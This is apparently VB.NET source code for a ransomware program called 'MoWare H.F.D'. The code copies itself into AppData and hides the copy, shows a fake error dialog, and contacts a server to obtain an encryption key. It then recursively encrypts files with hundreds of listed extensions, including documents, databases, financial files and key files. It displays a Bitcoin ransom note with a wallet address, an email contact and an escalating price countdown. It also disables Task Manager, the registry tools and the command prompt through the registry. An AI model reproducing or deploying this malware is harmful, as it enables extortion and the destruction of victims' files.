Imports System.Text
Imports System.Security.Cryptography
Imports System.Net
Imports System.IO


Public Class Form1
    Private vServer As String = "http://localhost/HFD/gen.php"
    Private vEmail As String = "ks.ali.crazy@gmail.com"
    Private vPrice As String = "0.02"
    Private expPrice As String = "0.05"
    Private vWallet As String = "15nbyuacLHfm3FrC5hz1nigNVqEbDwRUJq"
    Private valert As String = 2 ' minutes
    Dim AppData As String = System.Windows.Forms.Application.UserAppDataPath & "\MoWare H.F.D.exe"

    Dim HourTimer As DateTime
    Dim vExtension As New List(Of String)(New String() {"dat", ".mx0", ".cd", ".pdb", ".xqx", ".old", ".cnt", ".rtp", ".qss", ".qst", ".fx0", ".fx1", ".ipg", ".ert", ".pic", ".img", ".cur", ".fxr", ".slk", ".m4u", ".mpe", ".mov", ".wmv", ".mpg", ".vob", ".mpeg", ".3g2", ".m4v", ".avi", ".mp4", ".flv", ".mkv", ".3gp", ".asf", ".m3u", ".m3u8", ".wav", ".mp3", ".m4a", ".m", ".rm", ".flac", ".mp2", ".mpa", ".aac", ".wma", ".djv", ".pdf", ".djvu", ".jpeg", ".jpg", ".bmp", ".png", ".jp2", ".lz", ".rz", ".zipx", ".gz", ".bz2", ".s7z", ".tar", ".7z", ".tgz", ".rar", ".ziparc", ".paq", ".bak", ".set", ".back", ".std", ".vmx", ".vmdk", ".vdi", ".qcow", ".ini", ".accd", ".db", ".sqli", ".sdf", ".mdf", ".myd", ".frm", ".odb", ".myi", ".dbf", ".indb", ".mdb", ".ibd", ".sql", ".cgn", ".dcr", ".fpx", ".pcx", ".rif", ".tga", ".wpg", ".wi", ".wmf", ".tif", ".xcf", ".tiff", ".xpm", ".nef", ".orf", ".ra", ".bay", ".pcd", ".dng", ".ptx", ".r3d", ".raf", ".rw2", ".rwl", ".kdc", ".yuv", ".sr2", ".srf", ".dip", ".x3f", ".mef", ".raw", ".log", ".odg", ".uop", ".potx", ".potm", ".pptx", ".rsspptm", ".aaf", ".xla", ".sxd", ".pot", ".eps", ".as3", ".pns", ".wpd", ".wps", ".msg", ".pps", ".xlam", ".xll", ".ost", ".sti", ".sxi", ".otp", ".odp", ".wks", ".vcf", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".cntk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".sxc", ".vsd", ".ots", ".prn", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".dot", ".cal", ".shw", ".sldm", ".txt", ".csv", ".mac", ".met", ".wk3", ".wk4", ".uot", ".rtf", ".sldx", ".xls", ".ppt", ".stw", ".sxw", ".dtd", ".eml", ".ott", ".odt", ".doc", ".odm", ".ppsm", ".xlr", ".odc", ".xlk", ".ppsx", ".obi", ".ppam", ".text", ".docb", ".wb2", ".mda", ".wk1", ".sxm", ".otg", ".oab", ".cmd", ".bat", ".h", ".asx", ".lua", ".pl", ".as", ".hpp", ".clas", ".js", ".fla", ".py", ".rb", ".jsp", ".cs", ".c", ".jar", ".java", ".asp", ".vb", ".vbs", ".asm", ".pas", ".cpp", ".xml", ".php", ".plb", ".asc", ".lay6", ".pp4", ".pp5", ".ppf", ".pat", ".sct", ".ms11", ".lay", ".iff", ".ldf", ".tbk", ".swf", ".brd", ".css", ".dxf", ".dds", ".efx", ".sch", ".dch", ".ses", ".mml", ".fon", ".gif", ".psd", ".html", ".ico", ".ipe", ".dwg", ".jng", ".cdr", ".aep", ".aepx", ".123", ".prel", ".prpr", ".aet", ".fim", ".pfb", ".ppj", ".indd", ".mhtm", ".cmx", ".cpt", ".csl", ".indl", ".dsf", ".ds4", ".drw", ".indt", ".pdd", ".per", ".lcd", ".pct", ".prf", ".pst", ".inx", ".plt", ".idml", ".pmd", ".psp", ".ttf", ".3dm", ".ai", ".3ds", ".ps", ".cpx", ".str", ".cgm", ".clk", ".cdx", ".xhtm", ".cdt", ".fmv", ".aes", ".gem", ".max", ".svg", ".mid", ".iif", ".nd", ".2017", ".tt20", ".qsm", ".2015", ".2014", ".2013", ".aif", ".qbw", ".qbb", ".qbm", ".ptb", ".qbi", ".qbr", ".2012", ".des", ".v30", ".qbo", ".stc", ".lgb", ".qwc", ".qbp", ".qba", ".tlg", ".qbx", ".qby", ".1pa", ".ach", ".qpd", ".gdb", ".tax", ".qif", ".t14", ".qdf", ".ofx", ".qfx", ".t13", ".ebc", ".ebq", ".2016", ".tax2", ".mye", ".myox", ".ets", ".tt14", ".epb", ".500", ".txf", ".t15", ".t11", ".gpc", ".qtx", ".itf", ".tt13", ".t10", ".qsd", ".iban", ".ofc", ".bc9", ".mny", ".13t", ".qxf", ".amj", ".m14", "._vc", ".tbp", ".qbk", ".aci", ".npc", ".qbmb", ".sba", ".cfp", ".nv2", ".tfx", ".n43", ".let", ".tt12", ".210", ".dac", ".slp", ".qb20", ".saj", ".zdb", ".tt15", ".ssg", ".t09", ".epa", ".qch", ".pd6", ".rdy", ".sic", ".ta1", ".lmr", ".pr5", ".op", ".sdy", ".brw", ".vnd", ".esv", ".kd3", ".vmb", ".qph", ".t08", ".qel", ".m12", ".pvc", ".q43", ".etq", ".u12", ".hsr", ".ati", ".t00", ".mmw", ".bd2", ".ac2", ".qpb", ".tt11", ".zix", ".ec8", ".nv", ".lid", ".qmtf", ".hif", ".lld", ".quic", ".mbsb", ".nl2", ".qml", ".wac", ".cf8", ".vbpf", ".m10", ".qix", ".t04", ".qpg", ".quo", ".ptdb", ".gto", ".pr0", ".vdf", ".q01", ".fcr", ".gnc", ".ldc", ".t05", ".t06", ".tom", ".tt10", ".qb1", ".t01", ".rpf", ".t02", ".tax1", ".1pe", ".skg", ".pls", ".t03", ".xaa", ".dgc", ".mnp", ".qdt", ".mn8", ".ptk", ".t07", ".chg", ".#vc", ".qfi", ".acc", ".m11", ".kb7", ".q09", ".esk", ".09i", ".cpw", ".sbf", ".mql", ".dxi", ".kmo", ".md", ".u11", ".oet", ".ta8", ".efs", ".h12", ".mne", ".ebd", ".fef", ".qpi", ".mn5", ".exp", ".m16", ".09t", ".00c", ".qmt", ".cfdi", ".u10", ".s12", ".qme", ".int?", ".cf9", ".ta5", ".u08", ".mmb", ".qnx", ".q07", ".tb2", ".say", ".ab4", ".pma", ".defx", ".tkr", ".q06", ".tpl", ".ta2", ".qob", ".m15", ".fca", ".eqb", ".q00", ".mn4", ".lhr", ".t99", ".mn9", ".qem", ".scd", ".mwi", ".mrq", ".q98", ".i2b", ".mn6", ".q08", ".kmy", ".bk2", ".stm", ".mn1", ".bc8", ".pfd", ".bgt", ".hts", ".tax0", ".cb", ".resx", ".mn7", ".08i", ".mn3", ".ch", ".meta", ".07i", ".rcs", ".dtl", ".ta9", ".mem", ".seam", ".btif", ".11t", ".efsl", ".$ac", ".emp", ".imp", ".fxw", ".sbc", ".bpw", ".mlb", ".10t", ".fa1", ".saf", ".trm", ".fa2", ".pr2", ".xeq", ".sbd", ".fcpa", ".ta6", ".tdr", ".acm", ".lin", ".dsb", ".vyp", ".emd", ".pr1", ".mn2", ".bpf", ".mws", ".h11", ".pr3", ".gsb", ".mlc", ".nni", ".cus", ".ldr", ".ta4", ".inv", ".omf", ".reb", ".qdfx", ".pg", ".coa", ".rec", ".rda", ".ffd", ".ml2", ".ddd", ".ess", ".qbmd", ".afm", ".d07", ".vyr", ".acr", ".dtau", ".ml9", ".bd3", ".pcif", ".cat", ".h10", ".ent", ".fyc", ".p08", ".jsd", ".zka", ".hbk", ".bkf", ".mone", ".pr4", ".qw5", ".cdf", ".gfi", ".cht", ".por", ".qbz", ".ens", ".3pe", ".pxa", ".intu", ".trn", ".3me", ".07g", ".jsda", ".2011", ".fcpr", ".qwmo", ".t12", ".pfx", ".p7b", ".der", ".nap", ".p12", ".p7c", ".crt", ".csr", ".pem", ".gpg", ".key"})
    Dim pubsplit As String = "--!-A-!--"
    Public vDir(), vKey, vIdent As String
    Dim restoreform As New Form2
    Dim countdown As Date
    Public DateTo As Integer = 5
    Dim t1, t2, t3, t4, t5, t6


    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Hide()
        e.Cancel = True
        godead()
    End Sub
    Sub godead()
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
        AStartup(Me.Text, LO.fullname)
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        HourTimer = DateTime.Now
        loader.Start()
        'startup
        If File.Exists(AppData) Then
            Try
                IO.File.Delete(AppData)
            Catch ex As Exception
                Exit Try
            End Try
        Else
            Try
                IO.File.Copy(Application.ExecutablePath, AppData)
            Catch ex As Exception
            End Try
            Process.Start(AppData)
            Threading.Thread.Sleep("3000")
            SetAttr(AppData, FileAttribute.System)
            Try
                Shell("cmd.exe /k ping 0 & del " & ChrW(34) & LO.FullName & ChrW(34) & " & exit", AppWinStyle.Hide)
            Catch ex As Exception
            End Try
            Process.GetCurrentProcess.Kill()
        End If
        Me.Icon = My.Resources.ddddd
        Dim sDateTo As DateTime = Installeddate()
        sDateTo = sDateTo.AddDays(DateTo)
        t1 = sDateTo.ToString("hh")
        t2 = sDateTo.ToString("mm")
        t3 = sDateTo.ToString("ss")
        t4 = sDateTo.ToString("yyyy")
        t5 = sDateTo.ToString("MM")
        t6 = sDateTo.ToString("dd")
        countdown = FormatDateTime(t1 & ":" & t2 & ":" & t3 & " " & t4 & "-" & t5 & "-" & t6, DateFormat.GeneralDate)
        tmrCountdown.Start()
        vIdent = getUNIQE()
        Interaction.MsgBox("Runtime Error!" & vbNewLine & "Can't open application, it's not a valid Win32 application", MsgBoxStyle.Critical, "Application Error")
        'here we go
        'vDir = New String() {Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), Environment.GetFolderPath(Environment.SpecialFolder.Personal), Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)}
        vDir = New String() {Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) & "\test\"}
checkagain:
        If CheckForInternetConnection() Then
            Try
                connectServer()
            Catch ex As Exception
                GoTo checkagain
            End Try
        Else
            GoTo checkagain
        End If
        dirRecursive(vDir(0), vKey)
        RichTextBox1.Lines = New String() {"1. Buy Bitcoin (https://blockchain.info)", "2. Send amount of " + vPrice + " BTC to address: " + vWallet, "3. Transaction will take about 15-30 minutes to confirm.", "4. When transaction is confirmed, send email to us at " + vEmail, "5. Write subject of your mail with : ", String.Concat(New String() {vbTab & "'MoWare H.F.D - Restore my files ", Environment.MachineName, " / ", Environment.UserName, "'"}), "6. Write content of your mail with : ", vbTab & "'Bitcoin payment : (YOUR BITCOIN TRANSACTION ID) ", vbTab & "Computer Identifier : " + vIdent + "'", "7. We will contact you back with your private key."}
        Label3.Text = "Price will increase" & vbNewLine & _
            "with " & expPrice & " bitcoin" & vbNewLine & _
            "when time expired"


    End Sub
    Public Function dirRecursive(location As String, key As String) As Object
        Try
            Dim files As String() = Directory.GetFiles(location)
            Dim directories As String() = Directory.GetDirectories(location)
            For i = 0 To files.Length - 1
                Dim extension As String = Path.GetExtension(files(i))
                Dim fileInfo As FileInfo = New FileInfo(files(i))
                Dim length As Long = fileInfo.Length
                If vExtension.Contains(extension) And length < 100000000L Then
                    doEncrypt(files(i), key)
                    Form2.ListBox1.Items.Add(files(i) + ".H_F_D_locked")
                Else
                    If Path.GetExtension(files(i)) = ".H_F_D_locked" Then
                        Form2.ListBox1.Items.Add(files(i))
                    End If
                End If
            Next
            For j = 0 To directories.Length - 1
                dirRecursive(directories(j), key)
            Next
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
        Return Nothing
    End Function
    Public Sub connectServer()
        Try
            Dim str As String = New WebClient().DownloadString(vServer & "?generate=" & Environment.MachineName & " / " & Environment.UserName & "&hwid=" & vIdent)
            Dim resault As Boolean = str.ToLower().Contains("Error")
            If resault Then
                End
            Else
                Dim strArray As String() = Split(str, pubsplit)
                vKey = strArray(0)
                vIdent = strArray(1)
            End If
            Me.Show()
            Me.Focus()
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
     
    End Sub
    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Form2.Show()
        Form2.Focus()
    End Sub
    Private Sub tmrCountdown_Tick(sender As Object, e As EventArgs) Handles tmrCountdown.Tick
        Dim oldDate As Date = Date.Now
        Dim nowdate As Date = countdown
        Dim diff As TimeSpan = nowdate.Subtract(oldDate)
        Me.Label6.Text = diff.Days & " Days"
        Label10.Text = diff.Hours & ":" & diff.Minutes & ":" & diff.Seconds
        Try
            If diff.Days = 0 And diff.Hours = 0 And diff.Minutes = 0 & diff.Seconds = 0 Then
            End If
        Catch ex As Exception
            tmrCountdown.Stop()
            Label3.ForeColor = Color.Red
            Label3.Text = "Now, Price increased" & vbNewLine & "you will have to pay " & vbNewLine & expPrice & " Bitcoin"
            Label10.Text = "00:00:00"
            MsgBox("Your Left time run out" & vbNewLine & "Now, Price increased" & vbNewLine & "you will have to pay " & expPrice & " Bitcoin", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub loader_Tick(sender As Object, e As EventArgs) Handles loader.Tick
        Dim OneHour As DateTime = DateTime.Now
        Dim Hour As Double = (OneHour.Subtract(HourTimer)).TotalSeconds
        If Hour >= valert * 100 Then
            Me.Show()
            Me.TopMost = True
            Me.TopMost = False
            HourTimer = DateTime.Now
        End If
    End Sub
End Class
